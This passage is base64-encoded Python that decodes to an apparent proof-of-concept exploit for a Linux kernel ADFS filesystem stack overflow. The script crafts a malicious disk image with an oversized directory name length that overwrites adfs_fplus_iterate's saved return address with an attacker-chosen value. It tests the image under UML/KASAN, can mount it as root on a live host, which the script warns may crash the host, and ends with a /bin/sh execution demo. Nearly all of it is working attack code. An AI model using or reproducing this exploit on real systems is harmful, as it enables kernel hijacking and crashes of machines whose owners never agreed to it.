djEgPj4gOCkpICYgMHhmZmZmZmZmZjsgdjEgJj0gMHhmZgogICAgICAgIHYzID0gKHYzICsgbVtp
ICsgM10gKyAodjIgPj4gOCkpICYgMHhmZmZmZmZmZjsgdjIgJj0gMHhmZgogICAgICAgIGkgLT0g
NAogICAgdjAgPSAodjAgKyAodjMgPj4gOCkpICYgMHhmZmZmZmZmZgogICAgdjEgPSAodjEgKyBt
WzFdICsgKHYwID4+IDgpKSAmIDB4ZmZmZmZmZmYKICAgIHYyID0gKHYyICsgbVsyXSArICh2MSA+
PiA4KSkgJiAweGZmZmZmZmZmCiAgICB2MyA9ICh2MyArIG1bM10gKyAodjIgPj4gOCkpICYgMHhm
ZmZmZmZmZgogICAgcmV0dXJuICh2MCBeIHYxIF4gdjIgXiB2MykgJiAweGZmCgoKZGVmIF9jYWxj
X2JpZ2Rpcl9jaGVja2J5dGUoZGlyYnVmLCBlbmQpOgogICAgIiIiUmVwbGljYXRlIGFkZnNfZnBs
dXNfY2hlY2tieXRlIChmcy9hZGZzL2Rpcl9mcGx1cy5jKS4iIiIKICAgIGRpcmNoZWNrID0gMAog
ICAgb2ZmID0gMAogICAgcmVtYWluaW5nID0gZW5kCiAgICB3aGlsZSByZW1haW5pbmc6CiAgICAg
ICAgYnMgPSBCTEsgaWYgQkxLIDwgcmVtYWluaW5nIGVsc2UgcmVtYWluaW5nCiAgICAgICAgaSA9
IDAKICAgICAgICB3aGlsZSBpIDwgYnM6CiAgICAgICAgICAgIHcgPSBzdHJ1Y3QudW5wYWNrX2Zy
b20oJzxJJywgZGlyYnVmLCBvZmYgKyBpKVswXQogICAgICAgICAgICBkaXJjaGVjayA9IF9yb3Iz
MihkaXJjaGVjaywgMTMpIF4gdwogICAgICAgICAgICBpICs9IDQKICAgICAgICBvZmYgKz0gYnMK
ICAgICAgICByZW1haW5pbmcgLT0gYnMKICAgIHJldHVybiBkaXJjaGVjawoKCmRlZiBidWlsZF9h
ZGZzX2ltYWdlKG92ZXJmbG93X25hbWVsZW49NTEyLCBuYW1lX2ZpbGw9MHg0MSwgYXR0cj0weDMz
LAogICAgICAgICAgICAgICAgICAgICByZXRfb2Zmc2V0PU5vbmUsIHJldF92YWx1ZT1Ob25lKToK
ICAgICIiIlJldHVybiBieXRlcyBvZiBhIG1pbmltYWwgQURGUyBGKyBpbWFnZSB3aG9zZSBlbnRy
eSAwIGhhcwogICAgYmlnZGlyb2JuYW1lbGVuPW92ZXJmbG93X25hbWVsZW4gKD4yNjApIGFuZCBu
YW1lIGJ5dGVzID0gbmFtZV9maWxsLgoKICAgIElmIHJldF9vZmZzZXQgaXMgc2V0LCBhbiA4LWJ5
dGUgbGl0dGxlLWVuZGlhbiByZXRfdmFsdWUgaXMgcGxhbnRlZCBhdAogICAgbmFtZVtyZXRfb2Zm
c2V0Li5yZXRfb2Zmc2V0KzgpLiBUaGlzIGlzIHRoZSBSSVAtY29udHJvbCB2YXJpYW50CiAgICAo
b3ZlcmZsb3dfbmFtZWxlbj0zODgsIGF0dHI9MHgzYiwgcmV0X29mZnNldD0zODApIHRoYXQgbGFu
ZHMgb24KICAgIGFkZnNfZnBsdXNfaXRlcmF0ZSdzIHNhdmVkIHJldHVybiBhZGRyZXNzLiBuYW1l
WzAuLjRdICh0aGUgb25seSBuYW1lIGJ5dGVzCiAgICBjb3ZlcmVkIGJ5IHRoZSBiaWdkaXIgY2hl
Y2tieXRlKSBpcyBsZWZ0IGFzIG5hbWVfZmlsbCBzbyB0aGUgY2hlY2tieXRlIGhvbGRzLiIiIgog
ICAgaW1nID0gYnl0ZWFycmF5KElNR19TSVpFKQoKICAgICMgLS0tLSBibG9jayAwOiBtYXAgem9u
ZSAwICsgZGlzYyByZWNvcmQgKGRyMCBwYXRoLCBkaXNjIHJlY29yZCBAIGJ5dGUgNCkgLS0tLQog
ICAgem9uZSA9IGJ5dGVhcnJheSg1MTIpCiAgICB6b25lWzNdID0gMHhmZiAgICAgICAgICAgICAg
ICAgICAgICAgIyBjcm9zc2NoZWNrIChzaW5nbGUgem9uZSAtPiAweGZmKQogICAgZHIgPSBieXRl
YXJyYXkoNjApCiAgICBkclswXSAgPSBMT0cyU0VDU0laRQogICAgZHJbMV0gID0gMTsgZHJbMl0g
PSAxOyBkclszXSA9IDAKICAgIGRyWzRdICA9IElETEVOCiAgICBkcls1XSAgPSBMT0cyQlBNQgog
ICAgZHJbNl0gID0gMDsgZHJbN10gPSAwOyBkcls4XSA9IDAKICAgIGRyWzldICA9IE5aT05FUwog
ICAgZHJbMTA6MTJdID0gX2xlMTYoWk9ORV9TUEFSRSkKICAgIGRyWzEyOjE2XSA9IF9sZTMyKFJP
T1RfSU5EREFERFIpCiAgICBkclsxNjoyMF0gPSBfbGUzMihESVNDX1NJWkUpCiAgICBkclsyMDoy
Ml0gPSBfbGUxNigwKQogICAgZHJbMzI6MzZdID0gX2xlMzIoMCkKICAgIGRyWzM2OjQwXSA9IF9s
ZTMyKDApICAgICAgICAgICAgICAgICAjIGRpc2Nfc2l6ZV9oaWdoIG11c3QgYmUgMAogICAgZHJb
NDBdID0gKExPRzJTSEFSRVNJWkUgJiAweDBmKQogICAgZHJbNDFdID0gMHgwMSAgICAgICAgICAg
ICAgICAgICAgICAgICMgYmlnX2ZsYWc9MQogICAgZHJbNDJdID0gMDsgZHJbNDNdID0gMAogICAg
ZHJbNDQ6NDhdID0gX2xlMzIoRk9STUFUX1ZFUlNJT04pCiAgICBkcls0ODo1Ml0gPSBfbGUzMihS
T09UX1NJWkUpCiAgICB6b25lWzQ6NjRdID0gZHIKCiAgICAjIGZyYWdtZW50IGJpdHN0cmVhbSBz
dGFydGluZyBhdCBiaXQgNTEyCiAgICBfc2V0X2JpdCh6b25lLCA1MTIsIDEpICAgICAgICAgICAg
ICAgIyBmcmFnX2lkPTEgKGR1bW15KQogICAgX3NldF9iaXQoem9uZSwgNTI0LCAxKSAgICAgICAg
ICAgICAgICMgdGVybWluYXRvciBBCiAgICBfc2V0X2JpdCh6b25lLCA1MjYsIDEpICAgICAgICAg
ICAgICAgIyBmcmFnX2lkPTIgYml0MSAoMGIxMCkKICAgIF9zZXRfYml0KHpvbmUsIDUzNywgMSkg
ICAgICAgICAgICAgICAjIHRlcm1pbmF0b3IgQiAgLT4gcm9vdCBmcmFnIC0+IGJsb2NrIDEzCgog
ICAgem9uZVswXSA9IDAKICAgIHpvbmVbMF0gPSBfY2FsY196b25lY2hlY2soem9uZSkKICAgIGlt
Z1swOjUxMl0gPSB6b25lCgogICAgIyAtLS0tIGJsb2NrcyAxMy0xNjogcm9vdCBkaXJlY3Rvcnkg
KEYrIGJpZ2RpciwgMjA0OCBieXRlcykgLS0tLQogICAgQklHRElSX05BTUxFTiA9IDQKICAgIEJJ
R0RJUl9OQU1FU0laRSA9IDQKICAgIEJJR0RJUl9FTlRSSUVTID0gMQogICAgYmlnZGlyID0gYnl0
ZWFycmF5KDIwNDgpCgogICAgYmlnZGlyWzA6NF0gPSBieXRlcyg0KSAgICAgICAgICAgICAgICAg
ICAgICAgICAgIyBzdGFydG1hc3NlcSArIGJpZ2RpcnZlcnNpb24KICAgIGJpZ2Rpcls0OjhdID0g
X2xlMzIoQklHRElSU1RBUlROQU1FKQogICAgYmlnZGlyWzg6MTJdID0gX2xlMzIoQklHRElSX05B
TUxFTikKICAgIGJpZ2RpclsxMjoxNl0gPSBfbGUzMigyMDQ4KQogICAgYmlnZGlyWzE2OjIwXSA9
IF9sZTMyKEJJR0RJUl9FTlRSSUVTKQogICAgYmlnZGlyWzIwOjI0XSA9IF9sZTMyKEJJR0RJUl9O
QU1FU0laRSkKICAgIGJpZ2RpclsyNDoyOF0gPSBfbGUzMihST09UX0lORERBRERSKSAgICAgICAg
ICAgICMgYmlnZGlycGFyZW50CiAgICBiaWdkaXJbMjg6MzJdID0gYidyb290JyAgICAgICAgICAg
ICAgICAgICAgICAgICAjIGJpZ2Rpcm5hbWUKCiAgICBlb2ZmID0gMzIgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAjIGFkZnNfYmlnZGlyZW50cnkgKGVudHJ5IDApCiAgICBi
aWdkaXJbZW9mZiswOmVvZmYrNF0gICA9IF9sZTMyKDApICAgICAgICAgICAgICAjIGJpZ2Rpcmxv
YWQKICAgIGJpZ2Rpcltlb2ZmKzQ6ZW9mZis4XSAgID0gX2xlMzIoMCkgICAgICAgICAgICAgICMg
YmlnZGlyZXhlYwogICAgYmlnZGlyW2VvZmYrODplb2ZmKzEyXSAgPSBfbGUzMigwKSAgICAgICAg
ICAgICAgIyBiaWdkaXJsZW4KICAgIGJpZ2Rpcltlb2ZmKzEyOmVvZmYrMTZdID0gX2xlMzIoMHgw
MDAwMDMwMCkgICAgICMgYmlnZGlyaW5kYWRkciAoZnJhZyAzKQogICAgYmlnZGlyW2VvZmYrMTY6
ZW9mZisyMF0gPSBfbGUzMihhdHRyKSAgICAgICAgICAgICMgYmlnZGlyYXR0ciAoMHgzMyBkZWZh
dWx0OyAweDNiIGZvciBSSVApCiAgICBiaWdkaXJbZW9mZisyMDplb2ZmKzI0XSA9IF9sZTMyKG92
ZXJmbG93X25hbWVsZW4pICAjICoqKiBiaWdkaXJvYm5hbWVsZW4gVFJJR0dFUiAqKioKICAgIGJp
Z2Rpcltlb2ZmKzI0OmVvZmYrMjhdID0gX2xlMzIoMCkgICAgICAgICAgICAgICMgYmlnZGlyb2Ju
YW1lcHRyCgogICAgbmFtZV9vZmYgPSA2MCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgIyBuYW1lcyBhcmVhIChjaGVja2J5dGUgY292ZXJzIG9ubHkgWzYwLi42NCkpCiAgICBmb3Ig
aSBpbiByYW5nZShvdmVyZmxvd19uYW1lbGVuKToKICAgICAgICBiaWdkaXJbbmFtZV9vZmYgKyBp
XSA9IG5hbWVfZmlsbAogICAgaWYgcmV0X29mZnNldCBpcyBub3QgTm9uZSBhbmQgcmV0X3ZhbHVl
IGlzIG5vdCBOb25lOgogICAgICAgICMgUGxhbnQgdGhlIGNvbnRyb2xsZWQgc2F2ZWQgcmV0dXJu
IGFkZHJlc3MgKFJJUC1jb250cm9sIHZhcmlhbnQpLgogICAgICAgIHJ2ID0gc3RydWN0LnBhY2so
JzxRJywgcmV0X3ZhbHVlICYgMHhGRkZGRkZGRkZGRkZGRkZGKQogICAgICAgIGZvciBpIGluIHJh
bmdlKDgpOgogICAgICAgICAgICBiaWdkaXJbbmFtZV9vZmYgKyByZXRfb2Zmc2V0ICsgaV0gPSBy
dltpXQoKICAgIHRvZmYgPSAyMDQ4IC0gOCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICMgYWRmc19iaWdkaXJ0YWlsCiAgICBiaWdkaXJbdG9mZjp0b2ZmKzRdID0gX2xlMzIoQklHRElS
RU5ETkFNRSkKICAgIGJpZ2Rpclt0b2ZmKzRdID0gMDsgYmlnZGlyW3RvZmYrNV0gPSAwOyBiaWdk
aXJbdG9mZis2XSA9IDAKCiAgICBlbmQgPSAoMjggKyAoKEJJR0RJUl9OQU1MRU4gKyAzKSAmIH4z
KSArIEJJR0RJUl9FTlRSSUVTICogMjgpICsgQklHRElSX05BTUVTSVpFCiAgICBkYyA9IF9jYWxj
X2JpZ2Rpcl9jaGVja2J5dGUoYmlnZGlyLCBlbmQpCiAgICBkYyA9IF9yb3IzMihkYywgMTMpIF4g
QklHRElSRU5ETkFNRQogICAgZGMgPSBfcm9yMzIoZGMsIDEzKSBeIDAKICAgIGRjID0gX3JvcjMy
KGRjLCAxMykgXiAwCiAgICBkYyA9IF9yb3IzMihkYywgMTMpIF4gMAogICAgYmlnZGlyW3RvZmYg
KyA3XSA9IChkYyBeIChkYyA+PiA4KSBeIChkYyA+PiAxNikgXiAoZGMgPj4gMjQpKSAmIDB4ZmYK
CiAgICBpbWdbMTMgKiBCTEs6MTMgKiBCTEsgKyAyMDQ4XSA9IGJpZ2RpcgogICAgcmV0dXJuIGJ5
dGVzKGltZykKCgpkZWYgc2FuaXR5X2NoZWNrX2ltYWdlKGRhdGEsIG92ZXJmbG93X25hbWVsZW4p
OgogICAgIiIiQ2hlYXAgc3RydWN0dXJhbCBhc3NlcnRpb25zIHNvIGEgYmFkIGNyYWZ0ZXIgZmFp
bHMiIiIKICAgIGFzc2VydCBsZW4oZGF0YSkgPT0gSU1HX1NJWkUsIGxlbihkYXRhKQogICAgYmln
ZGlyID0gZGF0YVsxMyAqIEJMSzoxMyAqIEJMSyArIDIwNDhdCiAgICBhc3NlcnQgYmlnZGlyWzQ6
OF0gPT0gX2xlMzIoQklHRElSU1RBUlROQU1FKSwgImJpZ2RpcnN0YXJ0bmFtZSBtaXNtYXRjaCIK
ICAgIGFzc2VydCBzdHJ1Y3QudW5wYWNrX2Zyb20oJzxJJywgYmlnZGlyLCBlb2ZmIDo9IDMyICsg
MjApWzBdID09IG92ZXJmbG93X25hbWVsZW4sIFwKICAgICAgICAiYmlnZGlyb2JuYW1lbGVuIG5v
dCBzZXQiCiAgICBhc3NlcnQgYmlnZGlyWzIwNDA6MjA0NF0gPT0gX2xlMzIoQklHRElSRU5ETkFN
RSksICJiaWdkaXJlbmRuYW1lIG1pc21hdGNoIgogICAgcmV0dXJuIFRydWUKCgojID09PT09PT09
PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09
PT09PT09PT09PQojIDIuIFVNTC9LQVNBTiBiYWNrZW5kIChzYWZlLCBkZWZhdWx0KQojID09PT09
PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09
PT09PT09PT09PT09PQoKQURGU19GVU5DUyA9ICgiYWRmc19vYmplY3RfZml4dXAiLCAiYWRmc19m
cGx1c19nZXRuZXh0IiwgImFkZnNfZnBsdXNfaXRlcmF0ZSIpCgoKZGVmIHJ1bl91bWwoa2VybmVs
LCBpbml0cmFtZnMsIGltYWdlLCB0aW1lb3V0PTQwLCBtZW09IjJHIiwgbG9nX3BhdGg9Tm9uZSk6
CiAgICAiIiJCb290IFVNTCB3aXRoIHRoZSBpbWFnZSwgdHJpZ2dlciByZWFkZGlyLCByZXR1cm4g
Y2FwdHVyZWQgY29uc29sZSB0ZXh0LiIiIgogICAgaWYgbm90IG9zLnBhdGguZXhpc3RzKGtlcm5l
bCk6CiAgICAgICAgcmFpc2UgRmlsZU5vdEZvdW5kRXJyb3IoZiJVTUwga2VybmVsIG5vdCBmb3Vu
ZDoge2tlcm5lbH0iKQogICAgaWYgbm90IG9zLnBhdGguZXhpc3RzKGluaXRyYW1mcyk6CiAgICAg
ICAgcmFpc2UgRmlsZU5vdEZvdW5kRXJyb3IoZiJpbml0cmFtZnMgbm90IGZvdW5kOiB7aW5pdHJh
bWZzfSIpCiAgICBjbWQgPSBbCiAgICAgICAga2VybmVsLAogICAgICAgIGYiaW5pdHJkPXtpbml0
cmFtZnN9IiwKICAgICAgICBmInViZDA9e2ltYWdlfSIsCiAgICAgICAgImNvbjA9ZmQ6MCxmZDox
IiwgImNvbj1ub25lIiwKICAgICAgICBmIm1lbT17bWVtfSIsICJsb2dsZXZlbD04IiwgInBhbmlj
PTAiLAogICAgICAgICJBQ1RJT049cmVhZGRpciIsICJGU1Q9YWRmcyIsICJVQkRERVY9L2Rldi91
YmRhIiwgIk1PUFRTPXJvIiwKICAgIF0KICAgIHByb2MgPSBzdWJwcm9jZXNzLlBvcGVuKGNtZCwg
c3Rkb3V0PXN1YnByb2Nlc3MuUElQRSwgc3RkZXJyPXN1YnByb2Nlc3MuU1RET1VULAogICAgICAg
ICAgICAgICAgICAgICAgICAgICAgdGV4dD1UcnVlLCBidWZzaXplPTEpCiAgICB0cnk6CiAgICAg
ICAgb3V0LCBfID0gcHJvYy5jb21tdW5pY2F0ZSh0aW1lb3V0PXRpbWVvdXQpCiAgICAgICAgcmMg
PSBwcm9jLnJldHVybmNvZGUKICAgICAgICB0aW1lZF9vdXQgPSBGYWxzZQogICAgZXhjZXB0IHN1
YnByb2Nlc3MuVGltZW91dEV4cGlyZWQ6CiAgICAgICAgcHJvYy5raWxsKCkKICAgICAgICBvdXQs
IF8gPSBwcm9jLmNvbW11bmljYXRlKCkKICAgICAgICByYyA9IHByb2MucmV0dXJuY29kZQogICAg
ICAgIHRpbWVkX291dCA9IFRydWUKICAgIGlmIGxvZ19wYXRoOgogICAgICAgIHdpdGggb3Blbihs
b2dfcGF0aCwgInciKSBhcyBmOgogICAgICAgICAgICBmLndyaXRlKG91dCkKICAgIHJldHVybiBv
dXQsIHJjLCB0aW1lZF9vdXQKCgpkZWYgcGFyc2Vfb3V0cHV0KG91dCk6CiAgICAiIiJDbGFzc2lm
eSBjYXB0dXJlZCBjb25zb2xlIG91dHB1dC4gUmV0dXJucyBhIGRpY3Qgb2Ygc2lnbmFscy4iIiIK
ICAgIG1vdW50X29rID0gYm9vbChyZS5zZWFyY2gociJtb3VudCByYz0wfG1vdW50ZWQgT0siLCBv
dXQpKQogICAga2FzYW4gPSAiQlVHOiBLQVNBTjogc3RhY2stb3V0LW9mLWJvdW5kcyIgaW4gb3V0
CiAgICBhZGZzX2hpdHMgPSBbZiBmb3IgZiBpbiBBREZTX0ZVTkNTIGlmIGYgaW4gb3V0XQogICAg
b2JqX2ZyYW1lID0gYm9vbChyZS5zZWFyY2gociJcWzMyLFxzKjMyMFwpfCdvYmonIiwgb3V0KSkK
ICAgIHBhbmljID0gKCJLZXJuZWwgcGFuaWMiIGluIG91dCkgb3IgKCJLZXJuZWwgbW9kZSBmYXVs
dCIgaW4gb3V0KQogICAgY2hrX2ZhaWwgPSAiX19zdGFja19jaGtfZmFpbCIgaW4gb3V0CiAgICBj
b250cm9sbGVkID0gYm9vbChyZS5zZWFyY2gociI0MTQxNDE0MTQxNDE0MTQxfFIoPzoxWzAtNV18
OHw5fFtBLURdKT0weDQxNDEiLCBvdXQpKQogICAgcmV0dXJuIGRpY3QobW91bnRfb2s9bW91bnRf
b2ssIGthc2FuPWthc2FuLCBhZGZzX2hpdHM9YWRmc19oaXRzLAogICAgICAgICAgICAgICAgb2Jq
X2ZyYW1lPW9ial9mcmFtZSwgcGFuaWM9cGFuaWMsIGNoa19mYWlsPWNoa19mYWlsLAogICAgICAg
ICAgICAgICAgY29udHJvbGxlZD1jb250cm9sbGVkKQoKCmRlZiBldmlkZW5jZV9leGNlcnB0KG91
dCwgbWF4X2NoYXJzPTE2MDApOgogICAgaWR4ID0gb3V0LmZpbmQoIkJVRzogS0FTQU4iKQogICAg
aWYgaWR4IDwgMDoKICAgICAgICBpZHggPSBvdXQuZmluZCgiS2VybmVsIHBhbmljIikKICAgIGlm
IGlkeCA8IDA6CiAgICAgICAgaWR4ID0gbWF4KDAsIGxlbihvdXQpIC0gbWF4X2NoYXJzKQogICAg
cmV0dXJuIG91dFtpZHg6aWR4ICsgbWF4X2NoYXJzXS5yc3RyaXAoKQoKCmRlZiBwYXJzZV9yaXAo
b3V0LCByZXRfdmFsdWUpOgogICAgIiIiRGV0ZWN0IHdoZXRoZXIgdGhlIHBsYW50ZWQgcmV0dXJu
IGFkZHJlc3MgYWN0dWFsbHkgcmVkaXJlY3RlZCBSSVAuCgogICAgQ2Fub25pY2FsIHBsYW50ZWQg
dmFsdWUgIC0+IGByZXRgIGNvbXBsZXRlczsgZmF1bHRpbmcgSVAgPT0gcGxhbnRlZCB2YWx1ZS4K
ICAgIE5vbi1jYW5vbmljYWwgdmFsdWUgICAgICAtPiBDUFUgZmF1bHRzIEFUIHRoZSBgcmV0YCBp
bnN0cnVjdGlvbiBpbnN0ZWFkCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgKHN5bWJv
bCBhZGZzX2ZwbHVzX2l0ZXJhdGUrMHgyNmQgb24gdGhpcyBidWlsZCkuIiIiCiAgICByZXRfdmFs
dWUgJj0gMHhGRkZGRkZGRkZGRkZGRkZGCiAgICBtID0gcmUuc2VhcmNoKHIiS2VybmVsIG1vZGUg
ZmF1bHQgYXQgYWRkciAweFswLTlhLWZdKyxccyppcCAweChbMC05YS1mXSspIiwgb3V0KQogICAg
ZmF1bHRfaXAgPSBpbnQobS5ncm91cCgxKSwgMTYpIGlmIG0gZWxzZSBOb25lCiAgICBjYW5vbmlj
YWxfaGl0ID0gKGZhdWx0X2lwID09IHJldF92YWx1ZSkKICAgICMgMHgyNmQgPT0gb2Zmc2V0IG9m
IHRoZSBgcmV0YCBpbiBhZGZzX2ZwbHVzX2l0ZXJhdGUgb24gdGhlIDcuMC4xIFVNTCBidWlsZC4K
ICAgIHJldF9mYXVsdCA9IGJvb2wocmUuc2VhcmNoKHIiYWRmc19mcGx1c19pdGVyYXRlXCsweDI2
WzAtOWEtZl0vIiwgb3V0KSkKICAgIHZhbHVlX3NlZW4gPSAoZiJ7cmV0X3ZhbHVlOnh9IiBpbiBv
dXQubG93ZXIoKSkKICAgIHJldHVybiBkaWN0KGZhdWx0X2lwPSgiMHgleCIgJSBmYXVsdF9pcCBp
ZiBmYXVsdF9pcCBpcyBub3QgTm9uZSBlbHNlIE5vbmUpLAogICAgICAgICAgICAgICAgY2Fub25p
Y2FsX2hpdD1jYW5vbmljYWxfaGl0LCByZXRfZmF1bHQ9cmV0X2ZhdWx0LCB2YWx1ZV9zZWVuPXZh
bHVlX3NlZW4pCgoKIyA9PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09
PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT0KIyAzLiBIb3N0IGJhY2tlbmQKIyA9PT09
PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09
PT09PT09PT09PT09PT0KCmRlZiBfc2goY21kLCBjaGVjaz1UcnVlKToKICAgIHJldHVybiBzdWJw
cm9jZXNzLnJ1bihjbWQsIHNoZWxsPVRydWUsIGNhcHR1cmVfb3V0cHV0PVRydWUsIHRleHQ9VHJ1
ZSwKICAgICAgICAgICAgICAgICAgICAgICAgICBjaGVjaz1jaGVjaykuc3Rkb3V0CgoKZGVmIHJ1
bl9ob3N0KGltYWdlLCBtbnQpOgogICAgIiIiTW91bnQgdGhlIGltYWdlIG9uIHRoZSBsaXZlIGhv
c3Qga2VybmVsIGFuZCBsaXN0IGl0LiBDQU4gQ1JBU0ggVEhFIEhPU1QuIiIiCiAgICBpZiBvcy5n
ZXRldWlkKCkgIT0gMDoKICAgICAgICByYWlzZSBTeXN0ZW1FeGl0KCJob3N0IG1vZGUgcmVxdWly
ZXMgcm9vdCAoQ0FQX1NZU19BRE1JTiB0byBtb3VudCkiKQogICAgX3NoKCJtb2Rwcm9iZSBhZGZz
IDI+L2Rldi9udWxsIHx8IHRydWUiLCBjaGVjaz1GYWxzZSkKICAgIGJlZm9yZSA9IF9zaCgiam91
cm5hbGN0bCAtayAtLW5vLXBhZ2VyIC1uIDAgLS1zaW5jZSAnMSBtaW4gYWdvJyAyPi9kZXYvbnVs
bCB8fCAiCiAgICAgICAgICAgICAgICAgImRtZXNnIHwgdGFpbCAtbiA1IiwgY2hlY2s9RmFsc2Up
CiAgICBsb29wID0gTm9uZQogICAgb3V0ID0gW10KICAgIHRyeToKICAgICAgICBsb29wID0gX3No
KCJsb3NldHVwIC1mUCAtLXNob3cgIiArIGltYWdlKS5zdHJpcCgpCiAgICAgICAgb3V0LmFwcGVu
ZChmImxvb3A9e2xvb3B9IikKICAgICAgICBtbnRyZXMgPSBfc2goZiJtb3VudCAtdCBhZGZzIC1v
IHJvIHtsb29wfSB7bW50fSAyPiYxIiwgY2hlY2s9RmFsc2UpCiAgICAgICAgb3V0LmFwcGVuZChm
Im1vdW50OiB7bW50cmVzLnN0cmlwKCkgb3IgJ29rJ30iKQogICAgICAgIGlmIG9zLnBhdGguaXNt
b3VudChtbnQpOgogICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICBlbnRyaWVzID0gb3Mu
bGlzdGRpcihtbnQpCiAgICAgICAgICAgICAgICBvdXQuYXBwZW5kKGYibGlzdGRpciBvazoge2Vu
dHJpZXNbOjVdfSIpCiAgICAgICAgICAgIGV4Y2VwdCBPU0Vycm9yIGFzIGU6CiAgICAgICAgICAg
ICAgICBvdXQuYXBwZW5kKGYibGlzdGRpciByYWlzZWQ6IHtlIXJ9IChvZnRlbiBtZWFucyB0aGUg
b3ZlcmZsb3cgdHJpcHBlZCkiKQogICAgICAgIGVsc2U6CiAgICAgICAgICAgIG91dC5hcHBlbmQo
Im5vdCBtb3VudGVkIChhZGZzIHJlamVjdGVkIHRoZSBpbWFnZSkiKQogICAgZmluYWxseToKICAg
ICAgICBfc2goZiJ1bW91bnQge21udH0gMj4vZGV2L251bGwgfHwgdHJ1ZSIsIGNoZWNrPUZhbHNl
KQogICAgICAgIGlmIGxvb3A6CiAgICAgICAgICAgIF9zaChmImxvc2V0dXAgLWQge2xvb3B9IDI+
L2Rldi9udWxsIHx8IHRydWUiLCBjaGVjaz1GYWxzZSkKICAgIGFmdGVyID0gX3NoKCJkbWVzZyB8
IHRhaWwgLW4gNjAiLCBjaGVjaz1GYWxzZSkKICAgIHJldHVybiAiXG4iLmpvaW4ob3V0KSwgYWZ0
ZXIKCgojID09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09
PT09PT09PT09PT09PT09PT09PT09PT09PQojIDQuIEVMRiBleGVjdXRpb24gZGVtbyAoLS1leGVj
LWRlbW8pOiB0cmlnZ2VyIGV4ZWMoKSBvbiAvYmluL3NoIGZvciBjb25maXJtYXRpb24KIyA9PT09
PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09
PT09PT09PT09PT09PT0KCmRlZiBleGVjX2RlbW8oc2g9Ii9iaW4vc2ggd2hvYW1pIik6CiAgICAi
IiJWaXN1YWxseSBjb25maXJtIEVMRiBleGVjdXRpb246IHByb3ZlIC9iaW4vc2ggJiBscyBhcmUg
RUxGIGJpbmFyaWVzLCB0aGVuCiAgICBhY3R1YWxseSB0cmlnZ2VyIGV4ZWMoKSB0byBsb2FkIGFu
ZCBydW4gdGhlbSAoc3VicHJvY2VzcyBmb3JrK2V4ZWN2ZSwgYW5kIGEKICAgIHJhdyBvcy5mb3Jr
KCkrb3MuZXhlY3YoKSB0aGF0IHJlcGxhY2VzIGEgY2hpbGQncyBpbWFnZSB3aXRoIC9iaW4vc2gp
LiIiIgogICAgYmFyID0gIj0iICogNjQKICAgIHRyeToKICAgICAgICBzeXMuc3Rkb3V0LnJlY29u
ZmlndXJlKGxpbmVfYnVmZmVyaW5nPVRydWUpICAgIyBrZWVwIHByaW50IG9yZGVyIGNvcnJlY3Qg
dW5kZXIgcGlwZXMKICAgIGV4Y2VwdCBFeGNlcHRpb246CiAgICAgICAgcGFzcwogICAgcHJpbnQo
YmFyKQogICAgcHJpbnQoIkVMRiBFWEVDVVRJT04gREVNTyAgLS0gIHRyaWdnZXJpbmcgZXhlYygp
IikKICAgIHByaW50KGJhcikKCiAgICBscyA9IHNodXRpbC53aGljaCgibHMiKSBvciAiL3Vzci9i
aW4vbHMiCiAgICBoYXZlID0ge3Q6IHNodXRpbC53aGljaCh0KSBmb3IgdCBpbiAoImZpbGUiLCAi
cmVhZGVsZiIpfQoKICAgIHByaW50KCJcbiMjIyAxLiBUaGUgdGFyZ2V0cyBhcmUgRUxGIGJpbmFy
aWVzIikKICAgIGZvciBsYWJlbCwgcGF0aCBpbiAoKCJzaCIsIHNoKSwgKCJscyIsIGxzKSk6CiAg
ICAgICAgcHJpbnQoZiIgIHtsYWJlbDo0fSAtPiB7cGF0aH0iKQogICAgICAgIGlmIGhhdmVbImZp
bGUiXToKICAgICAgICAgICAgb3V0ID0gc3VicHJvY2Vzcy5ydW4oW2hhdmVbImZpbGUiXSwgcGF0
aF0sCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNhcHR1cmVfb3V0cHV0PVRydWUs
IHRleHQ9VHJ1ZSkuc3Rkb3V0LnN0cmlwKCkKICAgICAgICAgICAgcHJpbnQoZiIgICAgICAge291
dH0iKQoKICAgIGlmIGhhdmVbInJlYWRlbGYiXToKICAgICAgICBwcmludChmIlxuIyMjIDIuIEVM
RiBoZWFkZXIgb2Yge3NofSAgKHJlYWRlbGYgLWgpIikKICAgICAgICBvdXQgPSBzdWJwcm9jZXNz
LnJ1bihbaGF2ZVsicmVhZGVsZiJdLCAiLWgiLCBzaF0sCiAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgY2FwdHVyZV9vdXRwdXQ9VHJ1ZSwgdGV4dD1UcnVlKS5zdGRvdXQKICAgICAgICBmb3Ig
bGluZSBpbiBvdXQuc3BsaXRsaW5lcygpWzoxNF06CiAgICAgICAgICAgIHByaW50KCIgICAiLCBs
aW5lKQoKICAgIHByaW50KCJcbiMjIyAzLiBleGVjKCkgdmlhIHN1YnByb2Nlc3M6IC9iaW4vc2gg
LWMgJy4uLicgICAoZm9yaywgdGhlbiBleGVjdmUgL2Jpbi9zaCkiKQogICAgc2NyaXB0ID0gKAog
ICAgICAgICJlY2hvICdzaGVsbDogZXhlYyBzdWNjZWVkZWQgLS0gL2Jpbi9zaCAoYW4gRUxGKSBp
cyBub3cgcnVubmluZyc7ICIKICAgICAgICAiZWNobyBcImlkZW50aXR5OiAkKGJhc2VuYW1lIFwi
JDBcIikgcGlkPSQkXCI7ICIKICAgICAgICAiZWNobyAnLS0tIGxzIChhbHNvIGFuIEVMRikgZXhl
